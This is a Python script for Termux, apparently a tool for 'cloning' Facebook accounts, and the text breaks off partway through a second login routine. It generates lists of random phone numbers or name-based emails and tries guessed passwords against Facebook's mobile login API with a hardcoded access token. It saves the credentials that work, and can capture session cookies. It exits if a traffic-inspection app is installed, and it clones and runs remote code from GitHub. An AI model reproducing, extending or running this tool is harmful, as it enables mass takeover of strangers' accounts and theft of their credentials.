 ####@-----Import-----@####
import os,base64

os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
	a = "anar"
	t="tt"
	fileee = os.listdir('/sdcard/Android/data/')
	if f'com.h{t}pc{a}y.pro' in fileee:
		print('Delete Http Canary');sys.exit()
except:pass

lm = '/data/data/com.termux/files/usr/lib/python3.11'
if not 'print' in open(lm+'/site-packages/requests/sessions.py','r').read():
	pass
else:sys.exit()

import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0


####DESIGN####
def oo(t):
	return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '

###USERAGENTSGEN####
fbks=('FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

ua = []

import requests
rs = requests.get
ua = []

del ua
"""
aqib_ua(["Dalvik/2.1.0 (Linux; U; Android 11; moto g go Build/RRHGS31.Q3-37-43-43-5-4-6)","Dalvik/2.1.0 (Linux; U; Android 11; DL4 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346E Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2203 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 11; AKUS P1 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-T805Y Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A336N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546V Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; M18 Build/NRD91N)","Dalvik/2.1.0 (Linux; U; Android 11; Lenovo K14 Build/RON31.267-94)","Dalvik/1.6.0 (Linux; U; Android 5.1; B906 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X606F Build/QP1A.190711.020; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 10; PX4 Build/QQ2A.200305.004.A1)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 Build/S1RDS32.55-106-4)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6I Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 11; Black X Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; M2007J1SC Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; T610K Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOW32.121-40)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; E100 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) VD/218","Dalvik/2.1.0 (Linux; U; Android 7.0; TZ742 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 pro Build/T1TR33.43-20-15)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6823 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 lite Build/S2RKS32.92-11-21-13)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO AD9 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22i Build/SOW32.121-40)","Dalvik/2.1.0 (Linux; U; Android 12; A202ZT Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g31(w) Build/S3RWD32.123-29-8)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ72 Build/61.2.G.0.41)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; MID Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 10; TOX2 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; TANK 01 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; V1813T Build/P00610)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4 XL Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2205 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 9; AFTTIFF43 Build/PS7633.3449N)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; i75 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; M8L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; 220733SPI Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; P652 Pro Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; BLADE A6 Build/NMF26F)","Dalvik/2.1.0 (Linux; U; Android 6.0; X60 Plus Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; L-41A Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g200 5G Build/S1RXS32.50-13-5)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_AI2203_C Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; AFTBOXE1 Build/PS7600.3513N)","Dalvik/2.1.0 (Linux; U; Android 11; B610A115 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; rammus Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 12; Power Armor X11 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A127F Build/TP1A.220624.014) VD/213","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 55 Helium Plus Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 6.0; hiPower Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3562 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 11.1; p281 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TN33.14-55-3)","Dalvik/2.1.0 (Linux; U; Android 9; moto g(7) supra Build/PCO29.114-134)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH21 Build/QTG3.200305.006.S292)","Dalvik/2.1.0 (Linux; U; Android 13; NE2213 Build/SKQ1.221119.001)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia G10 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; G52L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; T702E_EEA Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A025G Build/SP1A.210812.016; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY48Z)","Dalvik/2.1.0 (Linux; U; Android 9; ANE Build/HUAWEIANE)","Dalvik/2.1.0 (Linux; U; Android 11; SM-T550 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 11; FP3 Build/8901.4.A.0022.0)","Dalvik/2.1.0 (Linux; U; Android 10; Freebox Player POP Build/QTT8.201201.002)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G973F Build/PPR1.180720.122)","Dalvik/2.1.0 (Linux; U; Android 12; RT3 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2273 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 12; Chromecast Build/STTE.221215.004.A1)","Dalvik/2.1.0 (Linux; U; Android 12; sdk_goog3_gpc_x86_64 Build/SE2B.220326.027)","Dalvik/2.1.0 (Linux; U; Android 11; Neo_Plus Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; moto g13 Build/THA33.31-24)","Dalvik/2.1.0 (Linux; U; Android 12; SM-T865N Build/SP2A.220305.013)","Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI RIO-TL00 Build/HUAWEIRIO-TL00)","Dalvik/2.1.0 (Linux; U; Android 13; 21091116UI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SO-51C Build/64.1.C.0.102A)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one action Build/PSB29.105-27)","Dalvik/2.1.0 (Linux; U; Android 11; m7332 Build/RP1A.200720.011)","Dalvik/1.6.0 (Linux; U; Android 7.1; Tecno G660MAX Build/HonorG660MAX)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-N935F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; SOG08 Build/63.1.C.0.582)","Dalvik/2.1.0 (Linux; U; Android 12; Dslide_809 Build/SQ1A.220105.002)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; GT6 Build/gt6)","Dalvik/2.1.0 (Linux; U; Android 12; LAVA LXX503 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; Playtv Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; LM-G900N Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)","Dalvik/2.1.0 (Linux; U; Android 9; AFTWMST22 Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 10; 7LC1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.de.6330.d4.software Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; PX1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 50 Cobalt Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 13; PHP110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; V2238 Build/TP1A.220624.014_NONFCMOD1)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T818 Build/NRD90M)"]) 
"""

ua=[]

##Logo##
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed

	
logo= f'''
{G}  ██   ██ ██   ██ ██     ██
{R}  ██   ██  ██ ██  ██     ██
{Y}  ███████   ███   ██  █  ██
{S}  ██   ██  ██ ██  ██ ███ ██
{uu}  ██   ██ ██   ██  ███ ███ 
\033[1;93m=================================
\033[1;97m Owner  : Hannan x Wasi :/
\033[1;97m GitHub : Hannan-404 :/
\033[1;97m Version:\033[1;92m 0.8 \033[1;97m:/
\033[1;97m Status : Free :/
\033[1;97m Notice : Use 10007/10006 For More OK Ids :/
\033[1;93m=================================
'''

####@-----Menu-----@####
def Hxw_Main():
    os.system("clear")
    print(logo)
    print(f"{oo(1)}File Cloning")
    print(f"{oo(2)}Pak Random Cloning")
    print(f"{oo(3)}Gmail Cloning")  
    print(f"{oo(4)}Create File")
    print(f"{oo(0)}Exit")
    inpp = input(f"{oo('?')}Your Choice : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     print(f'{oo("+")}Loading Best File Create Command ')
     os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
     os.system('cd && cd FILE ;python FILE.py')
     exit()
    if inpp == "0":
     exit('Exit!')
     
     
l = []

####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.Hannan'
    else:
        file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        Hxw_Main()
     
    method()
    exit()
    
            
   
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=hannan-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=hannan-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .Hannan')
        first = input(f'{oo("?")}Put First Name: ')
        last = input(f'{oo("?")}Put Last Name: ')
        domain = input(f'{oo("?")}Put Domain: ')
        try:
            limit = input(f'{oo("?")}Put Limit: ')
        except ValueError:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Hannan', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()

       
        
####@-----PakNumber-----@####


def pak():
	user=[]
	code = input(f'{oo("!")}Put Code : ')
	try:
		limit = int(input(f'{oo("?")}Put Limit :  '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	for psx in user:
		ids = code+psx
		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
	andom()



####@-----UserAgent----@####
"""
aqib_ua=(["Dalvik/2.1.0 (Linux; U; Android 11; moto g go Build/RRHGS31.Q3-37-43-43-5-4-6)","Dalvik/2.1.0 (Linux; U; Android 11; DL4 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346E Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2203 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 11; AKUS P1 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-T805Y Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A336N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546V Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; M18 Build/NRD91N)","Dalvik/2.1.0 (Linux; U; Android 11; Lenovo K14 Build/RON31.267-94)","Dalvik/1.6.0 (Linux; U; Android 5.1; B906 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X606F Build/QP1A.190711.020; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 10; PX4 Build/QQ2A.200305.004.A1)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 Build/S1RDS32.55-106-4)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6I Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 11; Black X Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; M2007J1SC Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; T610K Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOW32.121-40)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; E100 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) VD/218","Dalvik/2.1.0 (Linux; U; Android 7.0; TZ742 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 pro Build/T1TR33.43-20-15)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6823 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 lite Build/S2RKS32.92-11-21-13)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO AD9 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22i Build/SOW32.121-40)","Dalvik/2.1.0 (Linux; U; Android 12; A202ZT Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g31(w) Build/S3RWD32.123-29-8)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ72 Build/61.2.G.0.41)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; MID Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 10; TOX2 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; TANK 01 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; V1813T Build/P00610)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4 XL Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2205 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 9; AFTTIFF43 Build/PS7633.3449N)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; i75 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; M8L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; 220733SPI Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; P652 Pro Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; BLADE A6 Build/NMF26F)","Dalvik/2.1.0 (Linux; U; Android 6.0; X60 Plus Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; L-41A Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g200 5G Build/S1RXS32.50-13-5)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_AI2203_C Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; AFTBOXE1 Build/PS7600.3513N)","Dalvik/2.1.0 (Linux; U; Android 11; B610A115 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; rammus Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 12; Power Armor X11 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A127F Build/TP1A.220624.014) VD/213","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 55 Helium Plus Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 6.0; hiPower Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3562 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 11.1; p281 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TN33.14-55-3)","Dalvik/2.1.0 (Linux; U; Android 9; moto g(7) supra Build/PCO29.114-134)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH21 Build/QTG3.200305.006.S292)","Dalvik/2.1.0 (Linux; U; Android 13; NE2213 Build/SKQ1.221119.001)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia G10 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; G52L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; T702E_EEA Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A025G Build/SP1A.210812.016; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY48Z)","Dalvik/2.1.0 (Linux; U; Android 9; ANE Build/HUAWEIANE)","Dalvik/2.1.0 (Linux; U; Android 11; SM-T550 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 11; FP3 Build/8901.4.A.0022.0)","Dalvik/2.1.0 (Linux; U; Android 10; Freebox Player POP Build/QTT8.201201.002)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G973F Build/PPR1.180720.122)","Dalvik/2.1.0 (Linux; U; Android 12; RT3 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2273 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 12; Chromecast Build/STTE.221215.004.A1)","Dalvik/2.1.0 (Linux; U; Android 12; sdk_goog3_gpc_x86_64 Build/SE2B.220326.027)","Dalvik/2.1.0 (Linux; U; Android 11; Neo_Plus Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; moto g13 Build/THA33.31-24)","Dalvik/2.1.0 (Linux; U; Android 12; SM-T865N Build/SP2A.220305.013)","Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI RIO-TL00 Build/HUAWEIRIO-TL00)","Dalvik/2.1.0 (Linux; U; Android 13; 21091116UI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SO-51C Build/64.1.C.0.102A)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one action Build/PSB29.105-27)","Dalvik/2.1.0 (Linux; U; Android 11; m7332 Build/RP1A.200720.011)","Dalvik/1.6.0 (Linux; U; Android 7.1; Tecno G660MAX Build/HonorG660MAX)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-N935F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; SOG08 Build/63.1.C.0.582)","Dalvik/2.1.0 (Linux; U; Android 12; Dslide_809 Build/SQ1A.220105.002)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; GT6 Build/gt6)","Dalvik/2.1.0 (Linux; U; Android 12; LAVA LXX503 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; Playtv Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; LM-G900N Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)","Dalvik/2.1.0 (Linux; U; Android 9; AFTWMST22 Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 10; 7LC1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.de.6330.d4.software Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; PX1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 50 Cobalt Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 13; PHP110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; V2238 Build/TP1A.220624.014_NONFCMOD1)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T818 Build/NRD90M)",]) = 
"""
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'{oo("?")}Total Password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/Hannan-OK.txt")
    print('\033[1;93m='*25)
    print()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
